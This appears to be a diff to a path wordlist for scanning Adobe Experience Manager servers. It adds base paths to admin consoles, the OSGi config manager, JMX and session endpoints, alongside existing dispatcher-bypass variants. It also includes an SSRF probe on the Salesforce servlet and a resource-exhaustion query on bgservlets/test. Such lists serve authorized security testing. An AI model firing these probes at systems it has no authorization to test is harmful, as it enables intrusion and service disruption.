 /libs/dam/cloud/proxy.json.1.xml
@@ -1730,6 +1833,7 @@
 /libs/dam/cloud/proxy.json/a.ico
 /libs/dam/cloud/proxy.json;%0aa.css
 /libs/dam/cloud/proxy.json?.css
+/libs/granite/backup/content/admin.html
 /libs/granite/backup/content/admin.html.1.css
 /libs/granite/backup/content/admin.html.1.json
 /libs/granite/backup/content/admin.html.1.xml
@@ -1747,6 +1851,7 @@
 /libs/granite/backup/content/admin.html/a.ico
 /libs/granite/backup/content/admin.html;%0aa.css
 /libs/granite/backup/content/admin.html?.css
+/libs/granite/cluster/content/admin.html
 /libs/granite/cluster/content/admin.html.1.css
 /libs/granite/cluster/content/admin.html.1.json
 /libs/granite/cluster/content/admin.html.1.xml
@@ -1764,6 +1869,7 @@
 /libs/granite/cluster/content/admin.html/a.ico
 /libs/granite/cluster/content/admin.html;%0aa.css
 /libs/granite/cluster/content/admin.html?.css
+/libs/granite/core/content/login.html
 /libs/granite/core/content/login.html.1.css
 /libs/granite/core/content/login.html.1.json
 /libs/granite/core/content/login.html.1.xml
@@ -1781,6 +1887,7 @@
 /libs/granite/core/content/login.html/a.ico
 /libs/granite/core/content/login.html;%0aa.css
 /libs/granite/core/content/login.html?.css
+/libs/mcm/salesforce/customer.json
 /libs/mcm/salesforce/customer.json.1.css
 /libs/mcm/salesforce/customer.json.1.json
 /libs/mcm/salesforce/customer.json.1.xml
@@ -1798,6 +1905,7 @@
 /libs/mcm/salesforce/customer.json/a.ico
 /libs/mcm/salesforce/customer.json;%0aa.css
 /libs/mcm/salesforce/customer.json?.css
+/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e.1.css
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e.1.json
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e.1.xml
@@ -1815,6 +1923,7 @@
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e/a.ico
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e;%0aa.css
 /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://0.0.0.0&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e?.css
+/libs/opensocial/proxy
 /libs/opensocial/proxy.1.css
 /libs/opensocial/proxy.1.json
 /libs/opensocial/proxy.1.xml
@@ -1834,6 +1943,8 @@
 /libs/opensocial/proxy?.css
 /libs;%0aa.css
 /libs?.css
+/miscadmin
+/miscadmin#/etc/blueprints
 /miscadmin#/etc/blueprints.1.css
 /miscadmin#/etc/blueprints.1.json
 /miscadmin#/etc/blueprints.1.xml
@@ -1851,6 +1962,7 @@
 /miscadmin#/etc/blueprints/a.ico
 /miscadmin#/etc/blueprints;%0aa.css
 /miscadmin#/etc/blueprints?.css
+/miscadmin#/etc/designs
 /miscadmin#/etc/designs.1.css
 /miscadmin#/etc/designs.1.json
 /miscadmin#/etc/designs.1.xml
@@ -1868,6 +1980,7 @@
 /miscadmin#/etc/designs/a.ico
 /miscadmin#/etc/designs;%0aa.css
 /miscadmin#/etc/designs?.css
+/miscadmin#/etc/importers
 /miscadmin#/etc/importers.1.css
 /miscadmin#/etc/importers.1.json
 /miscadmin#/etc/importers.1.xml
@@ -1885,6 +1998,7 @@
 /miscadmin#/etc/importers/a.ico
 /miscadmin#/etc/importers;%0aa.css
 /miscadmin#/etc/importers?.css
+/miscadmin#/etc/mobile
 /miscadmin#/etc/mobile.1.css
 /miscadmin#/etc/mobile.1.json
 /miscadmin#/etc/mobile.1.xml
@@ -1902,6 +2016,7 @@
 /miscadmin#/etc/mobile/a.ico
 /miscadmin#/etc/mobile;%0aa.css
 /miscadmin#/etc/mobile?.css
+/miscadmin#/etc/msm/rolloutconfigs
 /miscadmin#/etc/msm/rolloutconfigs.1.css
 /miscadmin#/etc/msm/rolloutconfigs.1.json
 /miscadmin#/etc/msm/rolloutconfigs.1.xml
@@ -1919,6 +2034,7 @@
 /miscadmin#/etc/msm/rolloutconfigs/a.ico
 /miscadmin#/etc/msm/rolloutconfigs;%0aa.css
 /miscadmin#/etc/msm/rolloutconfigs?.css
+/miscadmin#/etc/segmentation
 /miscadmin#/etc/segmentation.1.css
 /miscadmin#/etc/segmentation.1.json
 /miscadmin#/etc/segmentation.1.xml
@@ -1953,6 +2069,7 @@
 /miscadmin/a.ico
 /miscadmin;%0aa.css
 /miscadmin?.css
+/mobileformsivs
 /mobileformsivs.1.css
 /mobileformsivs.1.json
 /mobileformsivs.1.xml
@@ -1970,6 +2087,7 @@
 /mobileformsivs/a.ico
 /mobileformsivs;%0aa.css
 /mobileformsivs?.css
+/siteadmin
 /siteadmin.1.css
 /siteadmin.1.json
 /siteadmin.1.xml
@@ -1987,6 +2105,7 @@
 /siteadmin/a.ico
 /siteadmin;%0aa.css
 /siteadmin?.css
+/system/admin
 /system/admin.1.css
 /system/admin.1.json
 /system/admin.1.xml
@@ -2004,6 +2123,7 @@
 /system/admin/a.ico
 /system/admin;%0aa.css
 /system/admin?.css
+/system/bgservlets/test
 /system/bgservlets/test.1.css
 /system/bgservlets/test.1.json
 /system/bgservlets/test.1.xml
@@ -2011,6 +2131,7 @@
 /system/bgservlets/test.html
 /system/bgservlets/test.ico
 /system/bgservlets/test.json
+/system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111
 /system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111.1.css
 /system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111.1.json
 /system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111.1.xml
@@ -2038,6 +2159,7 @@
 /system/bgservlets/test/a.ico
 /system/bgservlets/test;%0aa.css
 /system/bgservlets/test?.css
+/system/console
 /system/console.1.css
 /system/console.1.json
 /system/console.1.xml
@@ -2053,6 +2175,7 @@
 /system/console/a.gif
 /system/console/a.html
 /system/console/a.ico
+/system/console/configMgr
 /system/console/configMgr.1.css
 /system/console/configMgr.1.json
 /system/console/configMgr.1.xml
@@ -2070,6 +2193,7 @@
 /system/console/configMgr/a.ico
 /system/console/configMgr;%0aa.css
 /system/console/configMgr?.css
+/system/console/diskbenchmark
 /system/console/diskbenchmark.1.css
 /system/console/diskbenchmark.1.json
 /system/console/diskbenchmark.1.xml
@@ -2087,6 +2211,7 @@
 /system/console/diskbenchmark/a.ico
 /system/console/diskbenchmark;%0aa.css
 /system/console/diskbenchmark?.css
+/system/console/jmx/com.adobe.granite%3Atype%3DRepository
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository.1.css
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository.1.json
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository.1.xml
@@ -2104,6 +2229,7 @@
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository/a.ico
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository;%0aa.css
 /system/console/jmx/com.adobe.granite%3Atype%3DRepository?.css
+/system/console/jmx/java.lang%3Atype%3DRuntime
 /system/console/jmx/java.lang%3Atype%3DRuntime.1.css
 /system/console/jmx/java.lang%3Atype%3DRuntime.1.json
 /system/console/jmx/java.lang%3Atype%3DRuntime.1.xml
@@ -2121,6 +2247,7 @@
 /system/console/jmx/java.lang%3Atype%3DRuntime/a.ico
 /system/console/jmx/java.lang%3Atype%3DRuntime;%0aa.css
 /system/console/jmx/java.lang%3Atype%3DRuntime?.css
+/system/console/licenses
 /system/console/licenses.1.css
 /system/console/licenses.1.json
 /system/console/licenses.1.xml
@@ -2138,6 +2265,7 @@
 /system/console/licenses/a.ico
 /system/console/licenses;%0aa.css
 /system/console/licenses?.css
+/system/console/memoryusage
 /system/console/memoryusage.1.css
 /system/console/memoryusage.1.json
 /system/console/memoryusage.1.xml
@@ -2155,6 +2283,7 @@
 /system/console/memoryusage/a.ico
 /system/console/memoryusage;%0aa.css
 /system/console/memoryusage?.css
+/system/console/mimetypes
 /system/console/mimetypes.1.css
 /system/console/mimetypes.1.json
 /system/console/mimetypes.1.xml
@@ -2172,6 +2301,7 @@
 /system/console/mimetypes/a.ico
 /system/console/mimetypes;%0aa.css
 /system/console/mimetypes?.css
+/system/console/productinfo
 /system/console/productinfo.1.css
 /system/console/productinfo.1.json
 /system/console/productinfo.1.xml
@@ -2189,6 +2319,7 @@
 /system/console/productinfo/a.ico
 /system/console/productinfo;%0aa.css
 /system/console/productinfo?.css
+/system/console/profiler
 /system/console/profiler.1.css
 /system/console/profiler.1.json
 /system/console/profiler.1.xml
@@ -2206,6 +2337,7 @@
 /system/console/profiler/a.ico
 /system/console/profiler;%0aa.css
 /system/console/profiler?.css
+/system/console/vmstat
 /system/console/vmstat.1.css
 /system/console/vmstat.1.json
 /system/console/vmstat.1.xml
@@ -2225,6 +2357,7 @@
 /system/console/vmstat?.css
 /system/console;%0aa.css
 /system/console?.css
+/system/sling.js
 /system/sling.js.1.css
 /system/sling.js.1.json
 /system/sling.js.1.xml
@@ -2242,6 +2375,7 @@
 /system/sling.js/a.ico
 /system/sling.js;%0aa.css
 /system/sling.js?.css
+/system/sling/cqform/defaultlogin.html
 /system/sling/cqform/defaultlogin.html.1.css
 /system/sling/cqform/defaultlogin.html.1.json
 /system/sling/cqform/defaultlogin.html.1.xml
@@ -2259,6 +2393,7 @@
 /system/sling/cqform/defaultlogin.html/a.ico
 /system/sling/cqform/defaultlogin.html;%0aa.css
 /system/sling/cqform/defaultlogin.html?.css
+/system/sling/info.sessionInfo.json
 /system/sling/info.sessionInfo.json.1.css
 /system/sling/info.sessionInfo.json.1.json
 /system/sling/info.sessionInfo.json.1.xml
@@ -2276,6 +2411,7 @@
 /system/sling/info.sessionInfo.json/a.ico
 /system/sling/info.sessionInfo.json;%0aa.css
 /system/sling/info.sessionInfo.json?.css
+/system/sling/info.sessionInfo.txt
 /system/sling/info.sessionInfo.txt.1.css
 /system/sling/info.sessionInfo.txt.1.json
 /system/sling/info.sessionInfo.txt.1.xml
@@ -2293,6 +2429,7 @@
 /system/sling/info.sessionInfo.txt/a.ico
 /system/sling/info.sessionInfo.txt;%0aa.css
 /system/sling/info.sessionInfo.txt?.css
+/system/sling/loginstatus
 /system/sling/loginstatus.1.css
 /system/sling/loginstatus.1.json
 /system/sling/loginstatus.1.xml
@@ -2310,6 +2447,7 @@
 /system/sling/loginstatus/a.ico
 /system/sling/loginstatus;%0aa.css
 /system/sling/loginstatus?.css
+/var.1.json
 /var.1.json.1.css
 /var.1.json.1.json
 /var.1.json.1.xml
@@ -2327,6 +2465,7 @@
 /var.1.json/a.ico
 /var.1.json;%0aa.css
 /var.1.json?.css
+/var.1.xml
 /var.1.xml.1.css
 /var.1.xml.1.json
 /var.1.xml.1.xml
@@ -2344,6 +2483,7 @@
 /var.1.xml/a.ico
 /var.1.xml;%0aa.css
 /var.1.xml?.css
+/var.feed.xml
 /var.feed.xml.1.css
 /var.feed.xml.1.json
 /var.feed.xml.1.xml
@@ -2361,6 +2501,7 @@
 /var.feed.xml/a.ico
 /var.feed.xml;%0aa.css
 /var.feed.xml?.css
+/var.infinity.json
 /var.infinity.json.1.css
 /var.infinity.json.1.json
 /var.infinity.json.1.xml
@@ -2378,6 +2519,7 @@
 /var.infinity.json/a.ico
 /var.infinity.json;%0aa.css
 /var.infinity.json?.css
+/var.json
 /var.json.1.css
 /var.json.1.json
 /var.json.1.xml
@@ -2395,6 +2537,7 @@
 /var.json/a.ico
 /var.json;%0aa.css
 /var.json?.css
+/var.xml
 /var.xml.1.css
 /var.xml.1.json
 /var.xml.1.xml
@@ -2412,6 +2555,7 @@
 /var.xml/a.ico
 /var.xml;%0aa.css
 /var.xml?.css
+/var/classes.1.json
 /var/classes.1.json.1.css
 /var/classes.1.json.1.json
 /var/classes.1.json.1.xml
@@ -2429,6 +2573,7 @@
 /var/classes.1.json/a.ico
 /var/classes.1.json;%0aa.css
 /var/classes.1.json?.css
+/var/classes.1.xml
 /var/classes.1.xml.1.css
 /var/classes.1.xml.1.json
 /var/classes.1.xml.1.xml
@@ -2446,6 +2591,7 @@
 /var/classes.1.xml/a.ico
 /var/classes.1.xml;%0aa.css
 /var/classes.1.xml?.css
+/var/classes.feed.xml
 /var/classes.feed.xml.1.css
 /var/classes.feed.xml.1.json
 /var/classes.feed.xml.1.xml
@@ -2463,6 +2609,7 @@
 /var/classes.feed.xml/a.ico
 /var/classes.feed.xml;%0aa.css
 /var/classes.feed.xml?.css
+/var/classes.infinity.json
 /var/classes.infinity.json.1.css
 /var/classes.infinity.json.1.json
 /var/classes.infinity.json.1.xml
@@ -2480,6 +2627,7 @@
 /var/classes.infinity.json/a.ico
 /var/classes.infinity.json;%0aa.css
 /var/classes.infinity.json?.css
+/var/classes.json
 /var/classes.json.1.css
 /var/classes.json.1.json
 /var/classes.json.1.xml
@@ -2497,6 +2645,7 @@
 /var/classes.json/a.ico
 /var/classes.json;%0aa.css
 /var/classes.json?.css
+/var/classes.tidy.infinity.json
 /var/classes.tidy.infinity.json.1.css
 /var/classes.tidy.infinity.json.1.json
 /var/classes.tidy.infinity.json.1.xml
@@ -2514,6 +2663,7 @@
 /var/classes.tidy.infinity.json/a.ico
 /var/classes.tidy.infinity.json;%0aa.css
 /var/classes.tidy.infinity.json?.css
+/var/classes.xml
 /var/classes.xml.1.css
 /var/classes.xml.1.json
 /var/classes.xml.1.xml
@@ -2531,6 +2681,7 @@
 /var/classes.xml/a.ico
 /var/classes.xml;%0aa.css
 /var/classes.xml?.css
+/workspace
 /workspace.1.css
 /workspace.1.json
 /workspace.1.xml
